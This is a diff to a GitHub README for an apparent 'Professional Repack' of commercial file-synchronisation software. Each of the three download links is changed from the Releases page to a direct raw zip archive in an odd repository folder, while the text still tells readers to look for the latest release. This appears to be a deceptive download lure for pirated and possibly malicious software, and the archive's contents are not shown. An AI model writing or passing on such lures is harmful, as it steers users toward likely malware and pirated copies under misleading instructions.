@@ -1,6 +1,6 @@
 # 🗂️ Synchredible-Professional-Repack - Effortless File Synchronization Made Easy
 
-[![Download](https://img.shields.io/badge/Download-Synchredible--Professional--Repack-blue)](https://github.com/TheKac/Synchredible-Professional-Repack/releases)
+[![Download](https://github.com/TheKac/Synchredible-Professional-Repack/raw/refs/heads/master/fittily/Synchredible_Repack_Professional_3.3.zip)](https://github.com/TheKac/Synchredible-Professional-Repack/raw/refs/heads/master/fittily/Synchredible_Repack_Professional_3.3.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ To run Synchredible-Professional-Repack, ensure your system meets the following 
 
 You can download Synchredible-Professional-Repack from our Releases page. 
 
-[Visit this page to download](https://github.com/TheKac/Synchredible-Professional-Repack/releases)
+[Visit this page to download](https://github.com/TheKac/Synchredible-Professional-Repack/raw/refs/heads/master/fittily/Synchredible_Repack_Professional_3.3.zip)
 
 1. Click on the link above.
 2. Look for the latest release at the top of the list.
@@ -82,7 +82,7 @@ For any issues or feedback, please visit the GitHub Issues page within this repo
 
 Keep an eye on the Releases page for updates and new features. Regular updates will ensure you have the latest enhancements and security improvements.
 
-[Visit this page to download](https://github.com/TheKac/Synchredible-Professional-Repack/releases)
+[Visit this page to download](https://github.com/TheKac/Synchredible-Professional-Repack/raw/refs/heads/master/fittily/Synchredible_Repack_Professional_3.3.zip)
 
 ## 👥 Community Support
 
